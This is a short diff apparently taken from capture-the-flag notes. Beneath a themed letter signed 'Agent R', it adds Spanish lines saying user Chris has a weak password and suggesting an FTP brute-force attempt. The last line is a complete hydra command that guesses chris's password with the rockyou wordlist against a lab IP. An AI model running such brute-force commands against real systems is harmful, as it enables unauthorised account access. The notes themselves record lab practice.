@@ -22,3 +22,6 @@ Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, 
 
 From,
 Agent R 
+- Chris contraseña débil y R y J tienen un acuerdo.
+- Probamos fuerza bruta en ftp con chris
+- hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.128.166.133
